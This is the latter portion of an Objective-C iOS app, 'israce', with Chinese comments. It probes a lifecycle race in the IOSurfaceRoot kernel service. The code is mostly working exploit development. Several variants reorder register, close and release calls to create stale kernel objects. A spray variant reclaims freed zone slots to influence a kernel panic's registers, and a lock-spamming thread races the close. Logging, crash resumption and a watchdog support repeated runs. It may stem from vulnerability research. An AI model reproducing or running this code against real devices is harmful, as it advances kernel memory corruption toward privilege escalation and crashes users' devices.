            have[i2] = (openConn(&cs[i2]) == KERN_SUCCESS);
            if (have[i2]) callSel(cs[i2], SEL_REG, in, 24, gCalibShape, NULL);
            else cs[i2] = 0;
        }
        for (int i2 = N - 1; i2 >= 0; i2--) if (have[i2]) IOServiceClose(cs[i2]);
        break;
    }
    case V_MINI: {
        // 一次迭代，无附加线程、无抖动。nsurf 选顺序：
        //  0 create -> reg -> close -> release
        //  1 create -> close -> release                (不注册)
        //  2 create -> reg -> release -> close
        //  3 create -> release -> close                (不注册)
        //  4 create -> reg -> close                    (不释放)
        int mode = nsurf;
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        IOSurfaceRef_ s = mkSurface();
        if (!s) { IOServiceClose(c); rc = -102; break; }
        switch (mode) {
            case 0: callSel(c, SEL_REG, in, 24, gCalibShape, NULL);
                    IOServiceClose(c); CFRelease(s); break;
            case 1: IOServiceClose(c); CFRelease(s); break;
            case 2: callSel(c, SEL_REG, in, 24, gCalibShape, NULL);
                    CFRelease(s); IOServiceClose(c); break;
            case 3: CFRelease(s); IOServiceClose(c); break;
            case 4: callSel(c, SEL_REG, in, 24, gCalibShape, NULL);
                    IOServiceClose(c); break;
        }
        break;
    }
    case V_SPRAY: {
        // 回收控制：制造 stale 节点后，用 nsurf 个同尺寸 surface 抢 zone 释放槽，
        // 再 close。若 +0xd8 被我们影响，panic 的 far/x0 会变或 panic 消失。
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        IOSurfaceRef_ s = mkSurface();
        if (!s) { IOServiceClose(c); rc = -102; break; }
        callSel(c, SEL_REG, in, 24, gCalibShape, NULL);
        int N = (nsurf > 0 && nsurf <= 64) ? nsurf : 32;
        IOSurfaceRef_ spray[64];
        for (int i = 0; i < N; i++) spray[i] = mkSurface();
        IOServiceClose(c);
        CFRelease(s);
        for (int i = 0; i < N; i++) if (spray[i]) CFRelease(spray[i]);
        break;
    }
    case V_LOCKLITE: {
        io_connect_t c = 0;
        if (openConn(&c) != KERN_SUCCESS) { rc = -100; break; }
        callSel(c, SEL_REG, in, 24, gCalibShape, NULL);
        IOSurfaceRef_ s = mkSurface();
        if (!s) { IOServiceClose(c); rc = -102; break; }
        pthread_t th[1];
        gSpamRun = 1; gSpamConn = c; gSpamCount = 0;
        pthread_create(&th[0], NULL, spamLock, s);
        IOServiceClose(c);
        sleepUs(200);
        gSpamRun = 0;
        pthread_join(th[0], NULL);
        CFRelease(s);
        break;
    }
    default: rc = -999; break;
    }

    uint64_t ms = (nowNs() - t0) / 1000000ull;
    NSMutableString *f = [NSMutableString string];
    [f appendFormat:@",\"v\":%d,\"ms\":%llu,\"spam\":%llu",
        variant, (unsigned long long)ms, (unsigned long long)gSpamCount];
    for (int i = 0; i < nrc; i++)
        [f appendFormat:@",\"rc%d\":%u,\"n%d\":\"%s\"",
            i, rcs[i], i, rcName(rcs[i])];
    if (rc != -1) [f appendFormat:@",\"err\":%d", rc];
    endCase(key, f);
    if (nrc > 0 && rcs[0] == 0) gOK++;
    return 0;
}

// ---------------- 主流程 ----------------
static void runAll(void) {
    gCalibShape = calibrate();
    gCalib = gCalibShape;
    if (gCalibShape < 0) {
        noteEvent(@"abort", @",\"why\":\"calibration failed\"");
        return;
    }

    struct { int v; int n; int iters; const char *tag; } plan[] = {
        { V_METAL,  1,  40, "metalL" },
    };
    int nplan = (int)(sizeof(plan) / sizeof(plan[0]));

    for (int p = 0; p < nplan; p++) {
        for (int i = 0; i < plan[p].iters; i++) {
            if (gStop || nowSec() > kStartBudget) {
                noteEvent(@"budget", ([NSString stringWithFormat:
                    @",\"stopped_at\":\"%s-%d\",\"t\":%.2f", plan[p].tag, i, nowSec()]));
                return;
            }
            NSString *key = [NSString stringWithFormat:@"%s-N%d-I%04d",
                             plan[p].tag, plan[p].n, i];
            if ([gDone containsObject:key]) { gSkips++; continue; }
            beginCase(key, ([NSString stringWithFormat:
                @",\"v\":%d,\"n\":%d,\"i\":%d,\"shape\":%d",
                plan[p].v, plan[p].n, i, gCalibShape]));
            gRan++;
            @autoreleasepool { runCase(plan[p].v, plan[p].n, i, key); }
        }
        noteEvent(@"phase.done", ([NSString stringWithFormat:
            @",\"tag\":\"%s\",\"t\":%.2f", plan[p].tag, nowSec()]));
    }
}

// 读既有 ndjson，收集已完成 key（断点续跑）
static void loadDone(void) {
    NSString *path = [gTmp stringByAppendingPathComponent:@"israce.ndjson"];
    NSString *s = [NSString stringWithContentsOfFile:path
                                            encoding:NSUTF8StringEncoding error:nil];
    gDone = [NSMutableSet new];
    if (!s) return;
    for (NSString *line in [s componentsSeparatedByString:@"\n"]) {
        if (![line containsString:@"\"ph\":\"end\""]) continue;
        NSRange r1 = [line rangeOfString:@"\"k\":\""];
        if (r1.location == NSNotFound) continue;
        NSUInteger a = r1.location + r1.length;
        NSRange r2 = [line rangeOfString:@"\"" options:0
                                   range:NSMakeRange(a, line.length - a)];
        if (r2.location == NSNotFound) continue;
        [gDone addObject:[line substringWithRange:NSMakeRange(a, r2.location - a)]];
    }
    L(@"续跑：已有 %lu 条完成记录", (unsigned long)gDone.count);
}

static void writeSummary(void) {
    noteEvent(@"summary", ([NSString stringWithFormat:
        @",\"ran\":%d,\"ends\":%d,\"skips\":%d,\"ok0\":%d,\"t\":%.2f,\"shape\":%d",
        gRan, gEnds, gSkips, gOK, nowSec(), gCalibShape]));
    L(@"=== 完成: 发起 %d, 收尾 %d, 跳过(续跑) %d, rc0==0 的 %d, 用时 %.1fs",
      gRan, gEnds, gSkips, gOK, nowSec());
}

// ---------------- App ----------------
@interface AD : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UILabel *label;
@end

@implementation AD
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)o {
    gTmp = [NSTemporaryDirectory() copy];
    initClock();
    // NSTemporaryDirectory() 已经是 <container>/tmp/ —— 不要再拼一层
    NSString *dir = gTmp;

    gLog = fopen([[dir stringByAppendingPathComponent:@"israce.log"] UTF8String], "w");
    loadDone();
    gNd = fopen([[dir stringByAppendingPathComponent:@"israce.ndjson"] UTF8String], "a");

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *root = [UIViewController new];
    root.view.backgroundColor = [UIColor blackColor];
    UILabel *lab = [[UILabel alloc] initWithFrame:CGRectInset(UIScreen.mainScreen.bounds, 16, 60)];
    lab.text = @"israce: IOSurface +0xf1 生命周期竞态…";
    lab.textColor = [UIColor greenColor];
    lab.numberOfLines = 0;
    lab.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    [root.view addSubview:lab];
    self.label = lab;
    self.window.rootViewController = root;
    [self.window makeKeyAndVisible];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kWatchdog * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        if (gFinished) return;
        gFinished = 1; gStop = 1;
        L(@"!!! 看门狗 %.0fs", kWatchdog);
        writeSummary();
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{ exit(0); });
    });

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            loadIOSurface();
            // 服务探测：reach.json 里 class=IOSurfaceRoot / 注册名 IOCoreSurfaceRoot，
            // type 0 可开（其余 1..255 -> kIOReturnUnsupported）。按候选名逐个试。
            // 冷启动后 IOSurfaceRoot 可能还没发布：轮询最多 ~4s，别一次失败就 abort。
            const char *cand[] = { "IOSurfaceRoot", "IOCoreSurfaceRoot", "IOSurface", NULL };
            int scanTries = 0;
            for (int round = 0; round < 40 && !gSvc; round++) {
                scanTries++;
                for (int i = 0; cand[i] && !gSvc; i++) {
                    CFMutableDictionaryRef m = IOServiceMatching(cand[i]);
                    if (!m) continue;
                    io_iterator_t it = 0;
                    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, m, &it);
                    if (kr != KERN_SUCCESS || !it) continue;
                    io_object_t o; io_object_t first = 0;
                    while ((o = IOIteratorNext(it))) { if (!first) first = o; else IOObjectRelease(o); }
                    IOObjectRelease(it);
                    if (first) {
                        io_connect_t probe = 0;
                        kern_return_t r0 = IOServiceOpen(first, mach_task_self(), 0, &probe);
                        if (r0 == KERN_SUCCESS) {
                            gSvc = first;
                            IOServiceClose(probe);
                            L(@"cand %-18s 命中（第 %d 轮扫描）", cand[i], round + 1);
                        } else IOObjectRelease(first);
                    }
                }
                if (!gSvc) usleep(100000);   // 100ms
            }
            if (!gSvc) L(@"扫描 %d 轮后仍未拿到服务", scanTries);
            L(@"IOSurface service = 0x%x", gSvc);
            if (!gSvc) {
                noteEvent(@"abort", [NSString stringWithFormat:@",\"why\":\"no IOSurface service\",\"scanTries\":%d", scanTries]);
            } else {
                runAll();
            }
        }
        self.label.text = [NSString stringWithFormat:
            @"ran %d  ends %d  skip %d\nshape %d  %.1fs",
            gRan, gEnds, gSkips, gCalibShape, nowSec()];
        if (!gFinished) { gFinished = 1; writeSummary(); }
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{ exit(0); });
    });
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AD class]));
    }
}
